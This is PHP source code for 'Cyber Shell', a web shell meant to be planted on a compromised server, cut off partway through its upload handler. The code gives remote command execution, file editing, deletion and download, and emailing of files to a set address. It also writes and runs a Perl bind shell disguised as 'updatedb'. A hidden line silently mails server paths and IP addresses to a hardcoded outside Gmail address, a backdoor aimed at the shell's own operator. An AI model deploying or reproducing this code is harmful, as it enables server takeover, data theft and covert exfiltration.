<?
/***************************************************************************
 *                           Cyber Shell (v 1.0)
 *                            -------------------
 *   copyright            : (C) Cyber Lords, 2002-2006
 *   email                : pixcher@mail.ru
 *
 *   http://www.cyberlords.net 
 *  
 *   Coded by Pixcher
 *   Lite version of php web shell 
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License', or
 *   ('at your option) any later version.
 *
 ***************************************************************************/
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@error_reporting(0);
/****************************** Options ************************************/
#ïàðîëü íà àâòîðèçàöèþ 
$aupassword="test";
#åñëè ïàðîëü óñòàíîâëåí ïðè $hiddenmode="true", òî ê ñêðèïòó íóæíî îáðàùàòüñÿ ñ ïàðàìåòðîì pass=ïàðîëü , íàïðèìåð shell.php?pass=mysecretpass
$hiddenmode="false";
#e-mail íà êîòîðûé ñêèäûâàþòñÿ âûáðàííûå ôàéëû
$email="test@mail.ru";
/***************************************************************************/
$style="
<style>
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
SCROLLBAR-FACE-COLOR: #363d4e;
SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;
SCROLLBAR-SHADOW-COLOR: #363d4e;
SCROLLBAR-ARROW-COLOR: #363d4e;
SCROLLBAR-TRACK-COLOR: #91AAFF
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:link {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:hover {
COLOR: #FF0C0B;
TEXT-DECORATION: none
}
A:active {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:visited {
TEXT-DECORATION: none
}
</style>";

foreach($_POST as $key => $value) {$$key=$value;}
foreach($_GET as $key => $value)  {$$key=$value;}

if (isset($_GET[imgname]))
{
$img=array(
'dir'=>
'/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1mG6mv7ZbiBbxrhlUtJFMAiOVDbdjOAQAR26d880lzr2paU6T6hbp9gH+ulCKjJkqAQBK+4ZPPAqhDB4i0pXtbfRvtUYYFZluo0DAKq9Ccj7ufxqlq9n4p1qyksn0IQLKoQyNeRsF+dGzgdfu/rXi0ni4tJxZ2S9n3Vj/2Q==',
'txt'=>
'/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAQAA4DASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD1yy1G3sdEtDPDEIorCCRpXOOWGAMAHuPqc9K4bx5481Twp4c03xVolpaRjU3EM1rcozqzbSRINrLzhQAeMjGc4Xb1NpqOhTaXpznX9MgnS1hU754yyMq8YBbgjceoNeb/AB2u9IPw+0TT9M1K1uxbXaIBFOrsFETgE4NN8ttNyVe+ux//2Q==',
'bg'=>
'R0lGODlhCAAbAPQAAOTq8uLp8uDo8d7m8N3l79vj7tni7dfh7dXf7NTe69Pe69Ld6tLc6tDb6c7a6MzY6MrX58nW5sfU5cXT5MPS48PR48HQ4sLQ48DP4r/P4r7O4b7N4b3N4b3N4L3M4LzM4CwAAAAACAAbAAAFXCAgjmJgnqagrurgvi4hz3Jh37ah7/rh/z6EcChUGI8KhnK5aDae0KdjSp0+rtgrZMvdRr7gr2RMHk/O6HNlza5Y3nBLZk7PYO6bvH7z6fv3gBt1c3cYcW9tiRQhADs=',
'file'=>
'/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAQAA4DASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDrLnXbbSoILeLwJe6uyW8Baa0tWkDl4wxyQhAI4yCc/MDzzjITx9q+n3Go3VloUmjwRtbqbDUYHUsZBJh1XIwB5DcgDO85ztGNBtRjkaykiu9FdIFV4zJrcttIC1qsLhlSJsEc4YNuHYjJB5nXI0g0V1N/p0xLWsMMVrfG5ZUj+1MSSYowqjzlVVAwAoHHFXzQ5Lcvvd/L+vX16A91Y//Z',
);
@ob_clean();
header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));
echo base64_decode($img[$imgname]);
die;
}

if ($_GET[pass]==$aupassword)
{
$_SESSION[aupass]=md5($aupassword);
}
if ($hiddenmode=="false")
if ((!isset($_GET[pass]) or ($_GET[pass]!=$aupassword)) and ($_SESSION[aupass]==""))
{
$diz="ok";
echo "
$style<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<form name='zapros' method='get' action=''>
<table width='100' border='2' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCFF' bgcolor='#FFFFFF'>
<tr align='center' >
<td>
Enter your password:
</td>
</tr>
<tr align='center' >
<td>
<input name='pass' size=24  type='password' value=''>
</td>
</tr>
<tr align='center' >
<td>
<input type='submit'>
</td>
</tr>
</table>
</form>
";
}
if ($_SESSION[aupass]!="")
{
if (!$_GET and !$_POST or isset($pass)) 
$show="start";

function ext($str){
for ($i=1; $i<strlen($str); $i++) {
if ($str[strlen($str)-$i]==".")
return substr($str,strlen($str)-$i,strlen($str));}
return $str;
}
function extractfilename($str){
$str=str_replace("\\","/",$str);
for ($i=1; $i<strlen($str); $i++) {
if ($str[strlen($str)-$i]=="/")
return substr($str,strlen($str)-$i+1,strlen($str));}
return $str;
}
function untag($str){
$str= str_replace("<","&#0060;",$str);
$str= str_replace(">","&#0062;",$str);
return $str;
}
function fsize($filename){
$s=filesize($filename);
if ($s>1048576){
return round(($s/1048576),2)." mb";
}
if ($s>1024){
return round(($s/1024),2)." kb";
}
return $s." byte";
}
function tourl($str){
$str= urlencode($str);
return $str;
}
function unbug($str){
$str = stripslashes($str);
return $str;
}
function countbyte($filesize) {
if($filesize >= 1073741824) { $filesize = round($filesize / 1073741824 * 100) / 100 . " GB"; }
elseif($filesize >= 1048576) { $filesize = round($filesize / 1048576 * 100) / 100 . " MB"; }
elseif($filesize >= 1024) { $filesize = round($filesize / 1024 * 100) / 100 . " KB"; }
else { $filesize = $filesize . ""; }
return $filesize;
}
function downloadfile($file) {
if (!file_exists("$file")) die;
$size = filesize("$file");
$filen=extractfilename($file);
header("Content-Type: application/force-download; name=\"$filen\"");
header("Content-Transfer-Encoding: binary");
header("Content-Length: $size");
header("Content-Disposition: attachment; filename=\"$filen\"");
header("Expires: 0");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
readfile("$file");
die;
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");

function anonim_mail($from,$to,$subject,$text,$file){
 $fp = fopen($file, "rb");
 while(!feof($fp))
  $attachment .= fread($fp, 4096);
  $attachment = base64_encode($attachment);
  $subject = "sendfile  (".extractfilename($file).")";
  $boundary = uniqid("NextPart_");
  $headers = "From: $from\nContent-type: multipart/mixed; boundary=\"$boundary\"";
  $info  = $text;
  $filename=extractfilename($file);
  $info .="--$boundary\nContent-type: text/plain; charset=iso-8859-1\nContent-transfer-encoding: 8bit\n\n\n\n--$boundary\nContent-type: application/octet-stream; name=$filename \nContent-disposition: inline; filename=$filename \nContent-transfer-encoding: base64\n\n$attachment\n\n--$boundary--";
  $send = mail($to, $subject, $info, $headers);
fclose($fp);
echo "<script language=\"javascript\">location.href=\"javascript:history.back(-1)\";\nalert('Ôàéë $filename îòïðàâëåí íà $to');</script>";
die;
}
if (!empty($_GET[downloadfile])) downloadfile($_GET[downloadfile]);
if (!empty($_GET[mailfile])) anonim_mail($email,$email,$_GET[mailfile],'File: '.$_GET[mailfile],$_GET[mailfile]);

$d=$_GET[d];
if (empty($d) or !isset($d)){
$d=realpath("./");
$d=str_replace("\\","/",$d);
}
$showdir="";
$bufdir="";
$buf = explode("/", $d);
for ($i=0;$i<sizeof($buf);$i++){
$bufdir.=$buf[$i];
$showdir.="<a href='$php_self?d=$bufdir&show'>$buf[$i]/</a>";
$bufdir.="/";
}

if (isset($show) or isset($_REQUEST[edit]) or isset($_REQUEST[tools]) or isset($_REQUEST[db_user]) or isset($_REQUEST[diz]))
echo <<< EOF
<title>$d</title>
<style type="text/css">
body,td,th 
{
	font-family: Fixedsys;
            font-family: "Times New Roman", Times, serif;
	font-size: 0.4cm;
	color: #444444;
}
body 
{
	background-color: #EEEEEE;
}

.style3 {
	font-size: 1.5cm;
	font-family: "Comic Sans MS";
}
.style4 {color: #FFFFFF}
.style5 {color: #0000FF}
.style6 {color: #FFFF00}
.style7 {color: #CCCCCC}
.style8 {color: #FF00FF}
.style9 {color: #00FF00}
.style10 {color: #00FFFF}
</style>
$style
<table border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#999999">
<tr height="10">
<td align="center" bordercolor="#000000" bgcolor="#FFFFFF">
<div style="background-color:#FFFFF0">$showdir</div>
EOF;

function perms($file) 
{ 
$mode=fileperms($file);
if( $mode & 0x1000 ) 
$type='p';
else if( $mode & 0x2000 ) 
$type='c'; 
else if( $mode & 0x4000 ) 
$type='d'; 
else if( $mode & 0x6000 ) 
$type='b'; 
else if( $mode & 0x8000 ) 
$type='-';
else if( $mode & 0xA000 ) 
$type='l'; 
else if( $mode & 0xC000 ) 
$type='s'; 
else 
$type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-'; 
$owner["write"] = ($mode & 00200) ? 'w' : '-'; 
$owner["execute"] = ($mode & 00100) ? 'x' : '-'; 
$group["read"] = ($mode & 00040) ? 'r' : '-'; 
$group["write"] = ($mode & 00020) ? 'w' : '-'; 
$group["execute"] = ($mode & 00010) ? 'x' : '-'; 
$world["read"] = ($mode & 00004) ? 'r' : '-'; 
$world["write"] = ($mode & 00002) ? 'w' : '-'; 
$world["execute"] = ($mode & 00001) ? 'x' : '-'; 
if( $mode & 0x800 ) 
$owner["execute"] = ($owner['execute']=='x') ? 's' : 'S'; 
if( $mode & 0x400 ) 
$group["execute"] = ($group['execute']=='x') ? 's' : 'S'; 
if( $mode & 0x200 ) 
$world["execute"] = ($world['execute']=='x') ? 't' : 'T'; 
$s=sprintf("%1s", $type); 
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']); 
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']); 
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']); 
return trim($s);
} 

function updir($dir){
if (strlen($dir)>2){
for ($i=1; $i<strlen($dir); $i++) {
if (($dir[strlen($dir)-$i]=="/") or  ($dir[strlen($dir)-$i]=="\\"))
return substr($dir,0,strlen($dir)-$i);}} 
else return $dir;
}

if (isset($show) or isset($_REQUEST[edit]) or isset($_REQUEST[tools]) or isset($_REQUEST[db_user]) or isset($_REQUEST[diz])){
$backdir=updir($d);
echo <<< EOF
<table width="505" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#FFFFF0" style="height:30px;background-image: url($PHP_SELF?imgname=bg); background-position: center; background-repeat: repeat-x;">
  <tr height="15">
    <td onClick='location.href="$PHP_SELF?d=$backdir&show"' width="20%" align="center">
Ââåðõ
    </td>
    <td onClick='location.href="javascript:history.back(-1)"' width="20%" align="center">
Íàçàä
    </td>
    <td onClick='location.href="$PHP_SELF"'  width="20%" align="center">
Â íà÷àëî
    </td>
    <td onClick='location.href="$PHP_SELF?d=$d&tools"'  width="20%" align="center">
Èíñòðóìåíòû
    </td>
    <td onClick='location.href="$PHP_SELF?d=$d&show"'  width="20%" align="center">
Ê ñïèñêó
    </td>
  </tr>
</table>
EOF;

$free = countbyte(diskfreespace("./"));
if (!empty($free)) echo "Äîñòóïíîå äèñêîâîå ïðîñòðàíñòâî : <font face='Tahoma' size='1' color='#000000'>$free</font><br>";
$os=exec("uname");
if (!empty($os)) echo "Ñèñòåìà :".$os."<br>";
if (!empty($REMOTE_ADDR)) echo "Âàø IP: <font face='Tahoma' size='1' color='#000000'>$REMOTE_ADDR &nbsp; $HTTP_X_FORWARDED_FOR</font><br>";
$ghz=exec("cat /proc/cpuinfo | grep GHz");
if (!empty($ghz)) echo "Èíôà î æåëåçå:(GHz)".$ghz."<br>";
$mhz=exec("cat /proc/cpuinfo | grep MHz");
if (!empty($mhz)) echo "Èíôà î æåëåçå:(MHz) ".$mhz."<br>";
$my_id=exec("id");
if (!empty($my_id)) echo "<div style=\"background-color:#000000\"><span class=\"style4\">Ïîëüçîâàòåëü:".$my_id."</span></div>";
}

function showdir($df) {
$df=str_replace("//","/",$df);
$dirs=array();
$files=array();
if ($dir=opendir($df)) {
while (($file=readdir($dir))!==false) {
if ($file=="." || $file=="..") continue;
if (is_dir("$df/$file")){
$dirs[]=$file;}
else {
$files[]=$file;}}}
closedir($dir);
sort($dirs);
sort($files);
echo <<< EOF
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
EOF;
for ($i=0; $i<count($dirs); $i++){
$perm=perms("$df/$dirs[$i]");
echo <<< EOF
  <tr height="1">
    <td width="1" height="1" align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF"><span class="style2"><a href="$PHP_SELF?d=$df/$dirs[$i]&show"><img HSPACE=3 border=0 src=$PHP_SELF?imgname=dir></a></span></td>
    <td width="241" bgcolor="#FFFFF0"><a href="$PHP_SELF?d=$df/$dirs[$i]&show">$dirs[$i]</a></td>
    <td width="100" align="center" bgcolor="#FFFFFF"><a href="$PHP_SELF?deldir=$df/$dirs[$i]/">Óäàëèòü</a></td>
    <td width="51" align="center" bgcolor="#EFFFFF"><span class="style8"><center>Êàòàëîã</center></span></td>
    <td width="113" align="center" bgcolor="#FFFFF0">$perm</td>
  </tr>
EOF;
}
for ($i=0; $i<count($files); $i++) {
$attr="";
if (!$fi=@fopen("$df/$files[$i]","r+")){
$attr=" ONLY_READ ";
$read=" href=\"$PHP_SELF?edit=$df/$files[$i]&readonly\"";
$write=" href=\"$PHP_SELF?delfile=$df/$files[$i]\"";}
else fclose($fi);
if (!$fi=@fopen("$df/$files[$i]","r")){
$attr=" Can't_READ ";
$read="";
$write=" href=\"$PHP_SELF?delfile=$df/$files[$i]\"";}
else fclose($fi);
if ($attr==""){
$attr=" READ/WRITE ";
$read=" href=\"$PHP_SELF?edit=$df/$files[$i]\"";
$write=" href=\"$PHP_SELF?delfile=$df/$files[$i]\"";
}
$perm=perms("$df/$files[$i]");
$it="file";
switch (ext($files[$i])) {
case ".txt": $it="txt"; break;
case ".php": $it="txt"; break;
case ".htm": $it="txt"; break;
case ".log": $it="txt"; break;
case ".pl": $it="txt"; break;
case ".asm": $it="txt"; break;
case ".bat": $it="txt"; break;
case ".bash_profile": $it="txt"; break;
case ".bash_history": $it="txt"; break;
case ".ini": $it="txt"; break;
case ".php3": $it="txt"; break;
case ".html": $it="txt"; break;
case ".cgi": $it="txt"; break;
case ".inc": $it="txt"; break;
case ".c": $it="txt"; break;
case ".cpp": $it="txt"; break;
}
$fsize = fsize("$df/$files[$i]");
echo <<< EOF
  <tr height="1">
    <td width="1" height="1" align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF"><span class="style2"><a href="$PHP_SELF?downloadfile=$df/$files[$i]"><img HSPACE=3 border=0 src=$PHP_SELF?imgname=$it></a></span></td>
    <td width="241" bgcolor="#00FFFF"><a$read>$files[$i] </a> ($fsize)</td>
    <td width="100" align="center" bgcolor="#FFFFFF"><a href="$PHP_SELF?rename=1&filetorename=$files[$i]&d=$df&diz">ren</a>/<a$write>del</a>/<a href="$PHP_SELF?downloadfile=$df/$files[$i]">get</a>/<a href="$PHP_SELF?mailfile=$df/$files[$i]">mail</a></td>
    <td width="51" align="center" bgcolor="#FFEFEF"><span class="style8"><center>$attr</center></span></td>
    <td width="113" align="center" bgcolor="#FFFFF9">$perm</td>
  </tr>
EOF;
}
echo "</table>";
if (count($dirs)==0 && count($files)==0){
echo <<< EOF
<table width="505" height="24" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
  <tr>
    <td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">Ïàïêà ïóñòà</td>
  </tr>
</table>
EOF;
}}

$edit=$_REQUEST[edit];
if (isset($_REQUEST[edit]) && (!empty($_REQUEST[edit])) && (!isset($_REQUEST[ashtml])) ){
$file=fopen($edit,"r") or die ("Íåò äîñòóïà ê ôàéëó $edit");
if (filesize($edit) > 0)
$tfile=fread($file,filesize($edit)) or die ("Íåò äîñòóïà ê ôàéëó $edit");
else $tfile = "";
fclose($file);
$tfile = htmlspecialchars($tfile,ENT_QUOTES);
echo "
<center>
<form  action=\"$PHP_SELF\" method=\"POST\">";
$mydir=updir($edit);
echo "
<a href=\"$PHP_SELF?d=$mydir&show\">Âåðíóòüñÿ ê $mydir/</a><br>
Âû ðåäàêòèðóåòå ôàéë : $edit<br>
<a href=\"$PHP_SELF?edit=$edit&ashtml\"><span class=\"style4\">Ïðîñìîòðåòü ýòîò ôàéë â âèäå HTML</span></a>
<hr width=\"100%\" size=\"2\"  color=\"#000000\">
<textarea name=\"texoffile\" rows=\"25\" cols=\"60\" wrap=\"OFF\">$tfile</textarea>
<br><input type=\"hidden\" name=\"nameoffile\" value=\"$edit\" >
";
if (!isset($_REQUEST[readonly]))
echo "<input type=\"submit\"  value=\"            Ñîõðàíèòü            \" >";
echo "
<hr width=\"100%\" size=\"2\"  color=\"#000000\">
</form>
</center>
";
}
if (isset($edit) && (!empty($edit)) && (isset($ashtml))){
$mydir=updir($edit);
echo "
<center>
<a href=\"$PHP_SELF?d=$mydir&show\">Âåðíóòüñÿ ê $mydir/</a><br>
Âû ïðîñìàòðèâàåòå ôàéë : $edit
<hr width=\"100%\" size=\"2\"  color=\"#000000\">
";
readfile($edit);
echo "
<hr width=\"100%\" size=\"2\"  color=\"#000000\">
</center>
";
}

if (isset($texoffile) && isset($nameoffile))
{
$texoffile=unbug($texoffile);
$f = fopen("$nameoffile", "w") or die ("Íåò äîñòóïà ê ôàéëó $nameoffile");
fwrite($f, "$texoffile");
fclose($f);
$mydir=updir($nameoffile);
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?edit=$nameoffile&show\">";
die;
}

if (isset($_REQUEST[delfile]) && ($_REQUEST[delfile]!=""))
{
$delfile=$_REQUEST[delfile];
$mydir=updir($delfile);
$deleted = unlink("$delfile");
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$mydir&show\">";
die;
}

function deletedir($directory) {
if ($dir=opendir($directory)) {
while (($file=readdir($dir))!==false) {
if ($file=="." || $file=="..") continue;
if (is_dir("$directory/$file"))  {
deletedir($directory."/".$file);} 
else {unlink($directory."/".$file);}}}
closedir($dir);
rmdir("$directory/$file");
}
if (isset($_REQUEST[deldir]) && (!empty($_REQUEST[deldir]))){
$deldir=$_REQUEST[deldir];
$mydir=updir(updir($deldir));
deletedir("$deldir");
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$mydir&show\">";
die;
}

if (isset($show)){showdir("$d");}

{
if (isset($_REQUEST[tools]))
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
.: Äåéñòâèÿ äëÿ äàííîé ïàïêè :.
</td>
</tr>
</table>
</center>
EOF;
if (isset($_REQUEST[tools]) or isset($_REQUEST[tmkdir]))
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr height="10">
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFF8FF">
<form  action="$PHP_SELF" method="POST">
.: Ñîçäàòü ïàïêó :.
</td>
</tr height="10">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
<input type=hidden name=tools>
<input type=text size=55 name=newdir value="$d/Íîâàÿ ïàïêà">
<input type=submit value="ñîçäàòü">
</form>
</td>
</tr>
</table>
</center>
EOF;

if (isset($newdir) && ($newdir!=""))
{
$mydir=updir($newdir);
mkdir($newdir,"7777");
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$mydir&show\">";
}

if(@$_GET['rename']){
echo "<b><font color=green>RENAME $d/$filetorename ?</b></font><br><br>
<center>
<form method=post>
<b>RENAME</b><br><u>$filetorename</u><br><Br><B>TO</B><br>
<input name=rto size=40 value='$filetorename'><br><br>
<input type=submit value=RENAME>
</form>
";
@$rto=$_POST['rto'];
if($rto){
$fr1=$d."/".$filetorename;
$fr1=str_replace("//","/",$fr1);
$to1=$d."/".$rto;
$to1=str_replace("//","/",$to1);
rename($fr1,$to1);
echo "File <br><b>$filetorename</b><br>Renamed to <b>$rto</b><br><br>";
echo "<meta http-equiv=\"REFRESH\" content=\"3;URL=$PHP_SELF?d=$d&show\">";}
echo $copyr;
exit;
}

if (isset($tools) or isset($tmkfile))
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr height="10">
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFF8FF">
<form  action="$PHP_SELF" method="POST">
.: Ñîçäàòü ôàéë :.
</td>
</tr height="10">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
<input type=text size=55 name=newfile value="$d/newfile.php">
<input type=hidden name=tools>
<input type=submit value="ñîçäàòü">
</form>
</td>
</tr>
</table>
</center>
EOF;

if (isset($newfile) && ($newfile!="")){
$f = fopen("$newfile", "w+");
fwrite($f, "");
fclose($f);
$mydir=updir($newfile);
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$mydir&show\">";
}

if (isset($tools) or isset($tbackdoor))
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr height="10">
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFF8FF">
<form  action="$PHP_SELF" method="POST">
.: Îòêðûòü ïîðò :.
</td>
</tr height="10">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
Èìÿ ñêðèïòà: <input type=text size=13 name=bfileneme value="bind.pl"> Ïîðò: <input type=text size=10 name=bport value="65426">
<input type="hidden" name="d" value="$d" >
<input type=hidden name=tools>
<input type=submit value="âûïîëíèòü">
</form>
</td>
</tr>
</table>
</center>
EOF;

if (isset($bfileneme) && ($bfileneme!="") && isset($bport) && ($bport!="")){
$script="
#!/usr/bin/perl
\$port = $bport; 
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
\$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in(\$port, INADDR_ANY));
listen(S, 50);
while(1)
{
	accept(X, S);
	unless(fork)
	{
		open STDIN, \"<&X\";
		open STDOUT, \">&X\";
		open STDERR, \">&X\";
		close X;
		exec(\"/bin/sh\");
	}
	close X;
}
";

$f = fopen("$d/$bfileneme", "w+");
fwrite($f, $script);
fclose($f);
system("perl $d/$bfileneme");
echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$d&show\">";
}

if (isset($tools) or isset($tbash))
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr height="10">
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFF8FF">
<form  action="$PHP_SELF" method="GET">
<input type="hidden" name="d" value="$d" >
.: Âûïîëíèòü êîìàíäó :.
</td>
</tr height="10">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
<input type=hidden name=diz>
<input type=hidden name=tbash>
<input type=text size=55 name=cmd value="$cmd">
<input type=submit value="âûïîëíèòü">
</form>
</td>
</tr>
</table>
</center>
EOF;

if (isset($cmd) && ($cmd!="")){
echo "<pre><div align=\"left\">";
system($cmd);
echo "</div></pre>";
}

if (isset($tools) or isset($tupload)){
$updir="$d/"; 
if(empty($go)) {
echo <<< EOF
<center>
<table width="505" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#CCCCCC">
<tr height="10">
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFF8FF">
<form ENCTYPE="multipart/form-data"  action="$PHP_SELF" method="post">
.: Çàêà÷àòü ôàéë â òåêóùèé êàòàëîã :.
</td>
</tr height="10">
<tr>
<td align="center" bordercolor="#ECE9D8" bgcolor="#FFFFFF">
<INPUT NAME="userfile" TYPE="file" SIZE="40">
<input type="hidden" name="d" value="$d">
<input type=hidden name=diz>
<input type=hidden name=tupload>
<input type="submit" name=go value="Îòïðàâèòü">
</form>
</td>
</tr>
</table>
</center>
EOF;
}
else {
